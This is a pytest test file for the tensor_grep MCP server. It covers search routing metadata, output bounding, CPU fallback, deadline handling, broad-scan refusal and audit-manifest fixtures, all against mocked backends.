import asyncio
import hashlib
import hmac
import json
import os
import subprocess
import sys
import types
from importlib.metadata import version
from io import StringIO
from pathlib import Path
from subprocess import CompletedProcess
from unittest.mock import MagicMock, patch

import pytest

from tensor_grep.core.hardware.device_detect import DeviceInfo
from tensor_grep.core.hardware.device_inventory import DeviceInventory
from tensor_grep.core.result import MatchLine, SearchResult


def _canonical_manifest_bytes(manifest: dict[str, object]) -> bytes:
    canonical = dict(manifest)
    canonical.pop("manifest_sha256", None)
    canonical.pop("signature", None)
    return json.dumps(canonical, indent=2, sort_keys=True).encode("utf-8")


def _write_audit_manifest(
    path: Path,
    *,
    previous_manifest_sha256: str | None = None,
    project_root: Path | None = None,
    signing_key: bytes | None = None,
) -> dict[str, object]:
    payload: dict[str, object] = {
        "version": 1,
        "kind": "rewrite-audit-manifest",
        "created_at": "2026-03-23T12:00:00Z",
        "lang": "python",
        "path": str(project_root or path.parent),
        "plan_total_edits": 1,
        "applied_edit_ids": ["edit-1"],
        "checkpoint": None,
        "validation": None,
        "files": [
            {
                "path": "src/sample.py",
                "edit_ids": ["edit-1"],
                "before_sha256": "a" * 64,
                "after_sha256": "b" * 64,
            }
        ],
        "previous_manifest_sha256": previous_manifest_sha256,
    }
    payload["manifest_sha256"] = hashlib.sha256(_canonical_manifest_bytes(payload)).hexdigest()
    if signing_key is not None:
        payload["signature"] = {
            "kind": "hmac-sha256",
            "key_path": str(path.with_suffix(".key")),
            "value": hmac.new(
                signing_key,
                _canonical_manifest_bytes(payload),
                hashlib.sha256,
            ).hexdigest(),
        }
    path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return payload


def _write_scan_results(path: Path) -> dict[str, object]:
    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "builtin-ruleset-scan",
        "sidecar_used": False,
        "ruleset": "auth-safe",
        "rule_count": 1,
        "matched_rules": 1,
        "total_matches": 1,
        "findings": [
            {
                "rule_id": "python-eval",
                "language": "python",
                "severity": "high",
                "matches": 1,
                "files": ["src/sample.py"],
                "evidence": [{"file": "src/sample.py", "match_count": 1}],
            }
        ],
    }
    path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return payload


def _assert_audit_manifest_envelope(payload: dict[str, object], *, routing_reason: str) -> None:
    assert payload["version"] == 1
    assert payload["routing_backend"] == "AuditManifest"
    assert payload["routing_reason"] == routing_reason
    assert payload["sidecar_used"] is False


def _assert_enriched_edit_plan_seed(
    edit_plan_seed: dict[str, object],
    *,
    primary_file: Path | None = None,
    primary_symbol_name: str | None = None,
) -> None:
    if primary_file is not None:
        assert edit_plan_seed["primary_file"] == str(primary_file.resolve())
    else:
        assert isinstance(edit_plan_seed["primary_file"], str)
    if primary_symbol_name is not None:
        assert edit_plan_seed["primary_symbol"]["name"] == primary_symbol_name
    else:
        assert isinstance(edit_plan_seed["primary_symbol"]["name"], str)
    assert {"start_line", "end_line"} <= set(edit_plan_seed["primary_span"])
    assert edit_plan_seed["primary_span"]["start_line"] >= 1
    assert (
        edit_plan_seed["primary_span"]["end_line"] >= edit_plan_seed["primary_span"]["start_line"]
    )
    assert isinstance(edit_plan_seed["related_spans"], list)
    for related_span in edit_plan_seed["related_spans"]:
        assert {"file", "symbol", "start_line", "end_line", "depth", "score", "reasons"} <= set(
            related_span
        )
        assert related_span["end_line"] >= related_span["start_line"]
    assert isinstance(edit_plan_seed["dependent_files"], list)
    assert isinstance(edit_plan_seed["edit_ordering"], list)
    if primary_file is not None:
        assert edit_plan_seed["edit_ordering"][0] == str(primary_file.resolve())
    else:
        assert all(isinstance(path, str) for path in edit_plan_seed["edit_ordering"])
    assert 0.0 <= edit_plan_seed["rollback_risk"] <= 1.0
    assert {
        "import_resolution_quality",
        "parser_backed_count",
        "heuristic_count",
    } <= set(edit_plan_seed["dependency_trust"])
    assert edit_plan_seed["dependency_trust"]["import_resolution_quality"] in {
        "strong",
        "moderate",
        "weak",
    }
    assert edit_plan_seed["dependency_trust"]["parser_backed_count"] >= 0
    assert edit_plan_seed["dependency_trust"]["heuristic_count"] >= 0
    assert isinstance(edit_plan_seed["plan_trust_summary"], str)
    assert edit_plan_seed["plan_trust_summary"]
    assert isinstance(edit_plan_seed["validation_plan"], list)
    for step in edit_plan_seed["validation_plan"]:
        assert {"command", "scope", "runner", "confidence", "detection"} <= set(step)
        assert step["scope"] in {"symbol", "file", "repo"}
        assert step["detection"] in {"detected", "heuristic", "generic"}
        assert 0.0 <= step["confidence"] <= 1.0


def _assert_navigation_pack(
    navigation_pack: dict[str, object],
    *,
    primary_file: Path | None = None,
    primary_symbol_name: str | None = None,
) -> None:
    assert {
        "primary_target",
        "follow_up_reads",
        "parallel_read_groups",
        "related_tests",
        "validation_commands",
        "edit_ordering",
        "rollback_risk",
    } <= set(navigation_pack)
    primary_target = navigation_pack["primary_target"]
    assert {"file", "symbol", "start_line", "end_line", "mention_ref", "reasons"} <= set(
        primary_target
    )
    if primary_file is not None:
        assert primary_target["file"] == str(primary_file.resolve())
    else:
        assert isinstance(primary_target["file"], str)
    if primary_symbol_name is not None:
        assert primary_target["symbol"] == primary_symbol_name
    else:
        assert isinstance(primary_target["symbol"], str)
    assert primary_target["mention_ref"].startswith(primary_target["file"])
    assert "#L" in primary_target["mention_ref"]
    assert isinstance(navigation_pack["follow_up_reads"], list)
    assert navigation_pack["follow_up_reads"]
    for item in navigation_pack["follow_up_reads"]:
        assert {
            "file",
            "symbol",
            "start_line",
            "end_line",
            "mention_ref",
            "role",
            "rationale",
        } <= set(item)
        assert item["mention_ref"].startswith(item["file"])
        assert "#L" in item["mention_ref"]
        assert item["role"] in {"primary", "related", "test"}
    assert isinstance(navigation_pack["related_tests"], list)
    assert isinstance(navigation_pack["validation_commands"], list)
    assert navigation_pack["validation_commands"]
    assert isinstance(navigation_pack["parallel_read_groups"], list)
    assert navigation_pack["parallel_read_groups"]
    expected_phase = 0
    for group in navigation_pack["parallel_read_groups"]:
        assert {"phase", "label", "can_parallelize", "mentions", "files", "roles"} <= set(group)
        assert group["phase"] == expected_phase
        expected_phase += 1
        assert group["label"] in {"primary", "related", "test"}
        assert isinstance(group["can_parallelize"], bool)
        assert isinstance(group["mentions"], list)
        assert group["mentions"]
        assert isinstance(group["files"], list)
        assert group["files"]
        assert isinstance(group["roles"], list)
        assert group["roles"]
    assert isinstance(navigation_pack["edit_ordering"], list)
    assert 0.0 <= navigation_pack["rollback_risk"] <= 1.0


def _without_profiling(payload: dict[str, object]) -> dict[str, object]:
    cleaned = dict(payload)
    cleaned.pop("_profiling", None)
    cleaned.pop("profile", None)
    cleaned.pop("session_timing", None)
    return cleaned


def _mcp_tool_names() -> set[str]:
    from tensor_grep.cli import mcp_server

    return {tool.name for tool in asyncio.run(mcp_server.mcp.list_tools())}


def _call_mcp_tool_text(name: str, arguments: dict[str, object]) -> str:
    from tensor_grep.cli import mcp_server

    content, data = asyncio.run(mcp_server.mcp.call_tool(name, arguments))
    assert data["result"] == content[0].text
    return content[0].text


def test_tg_ast_search_accepts_ast_wrapper_backend():
    from tensor_grep.cli import mcp_server
    from tensor_grep.core.result import SearchResult

    fake_backend = type("AstGrepWrapperBackend", (), {"search": MagicMock()})()
    fake_backend.search.return_value = SearchResult(matches=[], total_files=0, total_matches=0)

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "AstGrepWrapperBackend"
        pipeline.selected_backend_reason = "ast_grep_json"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = []

        out = mcp_server.tg_ast_search("def $A():", "python", ".", structured_json=False)

    # round-8 (audit #95): path="." is now confined+resolved to an absolute cwd path before
    # being echoed back, so only the message PREFIX (not the exact trailing path) is stable.
    assert out.startswith("No AST matches found for pattern in ")
    assert "Routing: backend=" in out


def test_tg_search_includes_routing_summary_in_non_empty_output():
    from tensor_grep.cli import mcp_server

    fake_backend = MagicMock()
    fake_backend.search.return_value = SearchResult(
        matches=[MatchLine(line_number=1, text="ERROR here", file="a.log")],
        total_files=1,
        total_matches=1,
    )

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "CuDFBackend"
        pipeline.selected_backend_reason = "gpu_explicit_ids_cudf"
        pipeline.selected_gpu_device_ids = [7, 3]
        pipeline.selected_gpu_chunk_plan_mb = [(7, 256), (3, 512)]
        mock_scanner.return_value.walk.return_value = ["a.log"]

        out = mcp_server.tg_search("ERROR", ".")

    payload = json.loads(out)
    assert payload["total_matches"] == 1
    assert payload["total_files"] == 1
    routing = payload["routing"]
    assert routing["backend"] == "CuDFBackend"
    assert routing["reason"] == "gpu_explicit_ids_cudf"
    assert routing["gpu_device_ids"] == [7, 3]
    assert routing["gpu_chunk_plan_mb"] == [[7, 256], [3, 512]]
    assert routing["distributed"] is True
    assert routing["workers"] == 2


def test_tg_search_context_rows_do_not_inflate_header_count():
    from tensor_grep.cli import mcp_server

    fake_backend = MagicMock()
    fake_backend.search.return_value = SearchResult(
        matches=[
            MatchLine(line_number=1, text="before", file="a.log"),
            MatchLine(line_number=2, text="ERROR here", file="a.log"),
            MatchLine(line_number=3, text="after", file="a.log"),
        ],
        matched_file_paths=["a.log"],
        match_counts_by_file={"a.log": 1},
        total_files=1,
        total_matches=1,
        routing_backend="RipgrepBackend",
        routing_reason="rg_json",
    )

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "RipgrepBackend"
        pipeline.selected_backend_reason = "rg_json"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = ["a.log"]

        out = mcp_server.tg_search("ERROR", ".", context=1)

    payload = json.loads(out)
    # total_matches counts actual matches, not context rows
    assert payload["total_matches"] == 1
    assert payload["total_files"] == 1
    # rendered_match_count includes context rows (3 total lines)
    assert payload["rendered_match_count"] == 3
    line_numbers = [m["line_number"] for m in payload["matches"]]
    assert line_numbers == [1, 2, 3]
    texts = [m["text"] for m in payload["matches"]]
    assert texts == ["before", "ERROR here", "after"]


def test_tg_search_accepts_query_alias_and_bounds_text_output():
    from tensor_grep.backends.ripgrep_backend import RipgrepBackend
    from tensor_grep.cli import mcp_server

    backend = RipgrepBackend()
    backend.search = MagicMock(
        return_value=SearchResult(
            matches=[
                MatchLine(line_number=1, text="ERROR one", file="a.log"),
                MatchLine(line_number=2, text="ERROR two", file="a.log"),
                MatchLine(line_number=3, text="ERROR three", file="a.log"),
                MatchLine(line_number=1, text="ERROR four", file="b.log"),
            ],
            matched_file_paths=["a.log", "b.log"],
            total_files=2,
            total_matches=4,
        )
    )

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = backend
        pipeline.selected_backend_name = "RustCoreBackend"
        pipeline.selected_backend_reason = "native"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = ["a.log"]

        out = mcp_server.tg_search(
            pattern=None,
            query="ERROR",
            path=".",
            max_files=1,
            max_results=2,
        )

    backend.search.assert_called_once()
    assert backend.search.call_args.args[1] == "ERROR"
    payload = json.loads(out)
    assert payload["total_matches"] == 4
    assert payload["total_files"] == 2
    # bounded to 2 results across 1 file
    assert payload["rendered_match_count"] == 2
    assert payload["rendered_file_count"] == 1
    assert payload["truncated"] is True
    assert payload["omitted_matches"] == 2
    assert payload["omitted_files"] == 1
    rendered_files = {m["file"] for m in payload["matches"]}
    assert "a.log" in rendered_files
    assert "b.log" not in rendered_files
    rendered_texts = [m["text"] for m in payload["matches"]]
    assert "ERROR one" in rendered_texts
    assert "ERROR two" in rendered_texts
    assert "ERROR three" not in rendered_texts


def test_tg_search_can_return_bounded_structured_json():
    from tensor_grep.backends.ripgrep_backend import RipgrepBackend
    from tensor_grep.cli import mcp_server

    backend = RipgrepBackend()
    backend.search = MagicMock(
        return_value=SearchResult(
            matches=[
                MatchLine(line_number=1, text="ERROR one", file="a.log"),
                MatchLine(line_number=2, text="ERROR two", file="a.log"),
                MatchLine(line_number=1, text="ERROR three", file="b.log"),
            ],
            matched_file_paths=["a.log", "b.log"],
            total_files=2,
            total_matches=3,
            routing_backend="RipgrepBackend",
            routing_reason="rg_json",
        )
    )

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = backend
        pipeline.selected_backend_name = "RipgrepBackend"
        pipeline.selected_backend_reason = "rg_json"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = ["a.log"]

        out = mcp_server.tg_search(
            "ERROR",
            ".",
            max_files=1,
            max_results=2,
            structured_json=True,
        )

    payload = json.loads(out)
    assert payload["pattern"] == "ERROR"
    # round-8 (audit #95): path="." is now confined+resolved to an absolute cwd path.
    assert payload["path"] == str(Path.cwd().resolve())
    assert payload["total_matches"] == 3
    assert payload["total_files"] == 2
    assert payload["rendered_match_count"] == 2
    assert payload["rendered_file_count"] == 1
    assert payload["truncated"] is True
    assert payload["omitted_matches"] == 1
    assert payload["omitted_files"] == 1
    assert payload["matches"] == [
        {"file": "a.log", "line_number": 1, "text": "ERROR one"},
        {"file": "a.log", "line_number": 2, "text": "ERROR two"},
    ]
    assert payload["routing"]["backend"] == "RipgrepBackend"


def test_tg_search_uses_single_aggregate_ripgrep_search_for_cli_parity():
    from tensor_grep.backends.ripgrep_backend import RipgrepBackend
    from tensor_grep.cli import mcp_server

    backend = RipgrepBackend()
    backend.search = MagicMock(
        return_value=SearchResult(
            matches=[MatchLine(line_number=1, text="ERROR here", file="a.log")],
            matched_file_paths=["a.log"],
            match_counts_by_file={"a.log": 1},
            total_files=1,
            total_matches=1,
            routing_backend="RipgrepBackend",
            routing_reason="rg_json",
        )
    )

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = backend
        pipeline.selected_backend_name = "RipgrepBackend"
        pipeline.selected_backend_reason = "rg_json"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.side_effect = AssertionError(
            "MCP rg search must not enumerate explicit files"
        )

        out = mcp_server.tg_search("ERROR", ".")

    backend.search.assert_called_once()
    # round-8 (audit #95): path="." is now confined+resolved to an absolute cwd path before
    # being forwarded to the backend.
    assert backend.search.call_args.args[:2] == (str(Path.cwd().resolve()), "ERROR")
    payload = json.loads(out)
    assert payload["total_matches"] == 1
    assert payload["total_files"] == 1
    assert payload["routing"]["backend"] == "RipgrepBackend"
    assert payload["routing"]["reason"] == "rg_json"


def test_tg_search_should_report_runtime_routing_override_when_backend_falls_back():
    from tensor_grep.cli import mcp_server

    fake_backend = MagicMock()
    fake_backend.search.return_value = SearchResult(
        matches=[MatchLine(line_number=1, text="ERROR here", file="a.log")],
        total_files=1,
        total_matches=1,
        routing_backend="CPUBackend",
        routing_reason="torch_regex_cpu_fallback",
        routing_gpu_device_ids=[],
        routing_gpu_chunk_plan_mb=[],
        routing_distributed=False,
        routing_worker_count=1,
    )

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "TorchBackend"
        pipeline.selected_backend_reason = "gpu_explicit_ids_torch"
        pipeline.selected_gpu_device_ids = [7, 3]
        pipeline.selected_gpu_chunk_plan_mb = [(7, 256), (3, 512)]
        mock_scanner.return_value.walk.return_value = ["a.log"]

        out = mcp_server.tg_search("ERROR.*timeout", ".")

    payload = json.loads(out)
    routing = payload["routing"]
    assert routing["backend"] == "CPUBackend"
    assert routing["reason"] == "torch_regex_cpu_fallback"
    assert routing["gpu_device_ids"] == []
    assert routing["gpu_chunk_plan_mb"] == []
    assert routing["distributed"] is False
    assert routing["workers"] == 1


def test_tg_search_should_prefer_runtime_single_worker_gpu_metadata_over_selected_plan():
    from tensor_grep.cli import mcp_server

    fake_backend = MagicMock()
    fake_backend.search.return_value = SearchResult(
        matches=[MatchLine(line_number=1, text="ERROR here", file="a.log")],
        total_files=1,
        total_matches=1,
        routing_backend="CuDFBackend",
        routing_reason="cudf_chunked_single_worker_plan",
        routing_gpu_device_ids=[3],
        routing_gpu_chunk_plan_mb=[(3, 1)],
        routing_distributed=False,
        routing_worker_count=1,
    )

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "CuDFBackend"
        pipeline.selected_backend_reason = "gpu_explicit_ids_cudf"
        pipeline.selected_gpu_device_ids = [7, 3]
        pipeline.selected_gpu_chunk_plan_mb = [(7, 256), (3, 512)]
        mock_scanner.return_value.walk.return_value = ["a.log"]

        out = mcp_server.tg_search("ERROR", ".")

    payload = json.loads(out)
    routing = payload["routing"]
    assert routing["backend"] == "CuDFBackend"
    assert routing["reason"] == "cudf_chunked_single_worker_plan"
    assert routing["gpu_device_ids"] == [3]
    assert routing["gpu_chunk_plan_mb"] == [[3, 1]]
    assert routing["distributed"] is False
    assert routing["workers"] == 1


def test_tg_search_count_matches_should_respect_total_files_without_materialized_matches():
    # M10: `structured_json` defaults True everywhere else on this tool; the plain-text count
    # summary asserted here now requires explicitly opting OUT via `structured_json=False`.
    from tensor_grep.cli import mcp_server

    fake_backend = MagicMock()
    fake_backend.search.side_effect = [
        SearchResult(matches=[], total_files=1, total_matches=3),
        SearchResult(matches=[], total_files=0, total_matches=0),
    ]

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "RustCoreBackend"
        pipeline.selected_backend_reason = "rust_count"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = ["a.log", "b.log"]

        out = mcp_server.tg_search("ERROR", ".", count_matches=True, structured_json=False)

    # round-8 (audit #95): path="." is now confined+resolved to an absolute cwd path, so only
    # the message PREFIX (not the exact trailing path) is stable.
    assert out.startswith("Found a total of 3 matches across 1 files in ")
    assert "Routing: backend=RustCoreBackend reason=rust_count" in out
    assert "gpu_device_ids=[]" in out
    assert "gpu_chunk_plan_mb=[]" in out
    assert "distributed=False" in out
    assert "workers=0" in out


def test_tg_search_count_matches_defaults_to_parseable_structured_json():
    # M10 (Fable MCP-surface audit): `count_matches=True` used to ALWAYS return plain text
    # regardless of `structured_json` (default True) -- a default caller's `json.loads()`
    # would raise. It must now honor the flag like every other branch of this tool.
    from tensor_grep.cli import mcp_server

    fake_backend = MagicMock()
    fake_backend.search.side_effect = [
        SearchResult(matches=[], total_files=1, total_matches=3),
        SearchResult(matches=[], total_files=0, total_matches=0),
    ]

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "RustCoreBackend"
        pipeline.selected_backend_reason = "rust_count"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = ["a.log", "b.log"]

        out = mcp_server.tg_search("ERROR", ".", count_matches=True)

    payload = json.loads(out)  # must not raise
    assert payload["total_matches"] == 3
    assert payload["total_files"] == 1
    assert payload["routing"]["backend"] == "RustCoreBackend"
    assert payload["routing"]["reason"] == "rust_count"


def test_tg_search_should_render_count_only_file_summary_without_materialized_matches():
    from tensor_grep.cli import mcp_server

    fake_backend = MagicMock()
    fake_backend.search.side_effect = [
        SearchResult(
            matches=[],
            matched_file_paths=["a.log"],
            match_counts_by_file={"a.log": 3},
            total_files=1,
            total_matches=3,
        ),
        SearchResult(matches=[], total_files=0, total_matches=0),
    ]

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "RipgrepBackend"
        pipeline.selected_backend_reason = "rg_count"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = ["a.log", "b.log"]

        out = mcp_server.tg_search("ERROR", ".")

    payload = json.loads(out)
    assert payload["total_matches"] == 3
    assert payload["total_files"] == 1
    # count-only result: no materialized match lines rendered
    assert payload["rendered_match_count"] == 0
    assert payload["omitted_matches"] == 3
    assert payload["omitted_files"] == 1
    assert payload["routing"]["backend"] == "RipgrepBackend"
    assert payload["routing"]["reason"] == "rg_count"


def test_tg_ast_search_should_render_count_only_file_summary_without_materialized_matches():
    from tensor_grep.cli import mcp_server

    fake_backend = type("AstGrepWrapperBackend", (), {"search": MagicMock()})()
    fake_backend.search.side_effect = [
        SearchResult(
            matches=[],
            matched_file_paths=["a.py"],
            match_counts_by_file={"a.py": 2},
            total_files=1,
            total_matches=2,
        ),
        SearchResult(matches=[], total_files=0, total_matches=0),
    ]

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "AstGrepWrapperBackend"
        pipeline.selected_backend_reason = "ast_grep_json"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = ["a.py", "b.py"]

        out = mcp_server.tg_ast_search("def $A():", "python", ".")

    payload = json.loads(out)
    assert payload["total_matches"] == 2
    assert payload["total_files"] == 1
    # count-only result: no materialized match lines rendered
    assert payload["rendered_match_count"] == 0
    assert payload["omitted_matches"] == 2
    assert payload["omitted_files"] == 1
    assert payload["routing"]["backend"] == "AstGrepWrapperBackend"
    assert payload["routing"]["reason"] == "ast_grep_json"


# --- H3: PR #400 walk-deadline/fallback/broad-root-refusal ported to the MCP walk loops ---


def test_tg_search_backend_execution_error_falls_back_to_cpu_and_keeps_partial_results():
    from tensor_grep.backends.base import BackendExecutionError
    from tensor_grep.cli import mcp_server

    fault = BackendExecutionError("native panic")
    fake_backend = MagicMock()
    fake_backend.search.side_effect = [
        SearchResult(
            matches=[MatchLine(line_number=1, text="ERROR here", file="a.log")],
            matched_file_paths=["a.log"],
            total_files=1,
            total_matches=1,
        ),
        fault,
    ]
    cpu_fallback_result = SearchResult(
        matches=[MatchLine(line_number=2, text="ERROR too", file="b.log")],
        matched_file_paths=["b.log"],
        total_files=1,
        total_matches=1,
    )

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
        patch(
            "tensor_grep.cli.mcp_server._search_with_cpu_fallback",
            return_value=cpu_fallback_result,
        ) as mock_fallback,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "TorchBackend"
        pipeline.selected_backend_reason = "gpu_native"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = ["a.log", "b.log"]

        out = mcp_server.tg_search("ERROR", ".")

    mock_fallback.assert_called_once()
    assert mock_fallback.call_args.args[0] == "b.log"
    assert mock_fallback.call_args.args[3] is fault
    payload = json.loads(out)
    # Both the pre-fault match AND the CPU-fallback's match survive -- a mid-walk fault
    # must never discard results already collected (the pre-fix behavior: the outer
    # `except Exception` swallowed everything).
    assert payload["total_matches"] == 2
    assert {m["file"] for m in payload["matches"]} == {"a.log", "b.log"}


def test_tg_search_walk_deadline_exceeded_preserves_partial_results_and_flags_incomplete():
    from tensor_grep.cli import mcp_server

    fake_backend = MagicMock()
    fake_backend.search.return_value = SearchResult(
        matches=[MatchLine(line_number=1, text="ERROR here", file="a.log")],
        matched_file_paths=["a.log"],
        total_files=1,
        total_matches=1,
    )

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
        patch(
            "tensor_grep.cli.mcp_server.native_walk_deadline_exceeded",
            side_effect=[False, True],
        ),
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "TorchBackend"
        pipeline.selected_backend_reason = "gpu_native"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = ["a.log", "b.log", "c.log"]

        out = mcp_server.tg_search("ERROR", ".")

    # Only the first file was searched before the (mocked) deadline tripped.
    assert fake_backend.search.call_count == 1
    payload = json.loads(out)
    assert payload["total_matches"] == 1
    assert payload["result_incomplete"] is True
    assert "deadline" in payload["incomplete_reason"]
    assert payload["truncated"] is True


def test_tg_search_refuses_vendored_root_scan_with_actionable_message(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    (tmp_path / "vendor").mkdir()
    (tmp_path / "vendor" / "dep.py").write_text("x = 1\n", encoding="utf-8")

    fake_backend = MagicMock()  # a generic non-RipgrepBackend double

    with patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline:
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "TorchBackend"
        pipeline.selected_backend_reason = "gpu_native"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []

        out = mcp_server.tg_search("ERROR", str(tmp_path))

    fake_backend.search.assert_not_called()
    payload = json.loads(out)
    assert payload["error"]["code"] == "broad_scan_refused"
    assert "vendor" in payload["error"]["message"]
    assert payload["result_incomplete"] is True
    assert payload["truncated"] is True


def test_tg_search_refuses_large_root_scan_for_non_ripgrep_backend():
    from tensor_grep.cli import mcp_server

    fake_backend = MagicMock()
    many_files = [f"file_{i}.log" for i in range(2000)]

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "TorchBackend"
        pipeline.selected_backend_reason = "gpu_native"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = many_files

        out = mcp_server.tg_search("ERROR", ".")

    fake_backend.search.assert_not_called()
    payload = json.loads(out)
    assert payload["error"]["code"] == "broad_scan_refused"
    assert "1500" in payload["error"]["message"]


def test_tg_search_refuses_glob_with_default_path_on_large_root():
    """Bug #88 (dogfood v1.54.0): a `glob` filter narrows WHICH files match, it does not
    bound how much of the tree must be walked to find them. The MCP `path` parameter defaults
    to "." at the Python level, indistinguishable from an omitted argument, so `glob` alone
    must not exempt a `path="."` call from the large-root refusal -- otherwise a bare
    `tg_search(pattern=..., glob=...)` MCP call walks/searches an oversized root unbounded,
    the same shape as the CLI's bare `tg search --glob ... PATTERN` hang."""
    from tensor_grep.cli import mcp_server

    fake_backend = MagicMock()
    many_files = [f"file_{i}.py" for i in range(2000)]

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "TorchBackend"
        pipeline.selected_backend_reason = "gpu_native"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = many_files

        out = mcp_server.tg_search("ERROR", ".", glob="*.py")

    fake_backend.search.assert_not_called()
    payload = json.loads(out)
    assert payload["error"]["code"] == "broad_scan_refused"
    assert "1500" in payload["error"]["message"]


def _tg_search_rank_fixture():
    """Shared Pipeline/DirectoryScanner mock producing 2 matches for --rank/--semantic tests."""
    fake_backend = MagicMock()
    fake_backend.search.return_value = SearchResult(
        matches=[MatchLine(line_number=1, text="ERROR here", file="a.log")],
        matched_file_paths=["a.log"],
        total_files=1,
        total_matches=1,
    )
    return fake_backend


def test_tg_search_rank_reranks_by_bm25(monkeypatch):
